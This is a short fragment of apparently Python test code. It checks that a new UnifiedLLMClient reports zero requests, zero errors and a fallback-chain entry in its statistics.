        from app.core.unifiedllm.unified_client import UnifiedLLMClient
        client = UnifiedLLMClient()
        stats = client.get_stats()
        assert stats["request_count"] == 0
        assert stats["errors"] == 0
        assert "fallback_chain" in stats
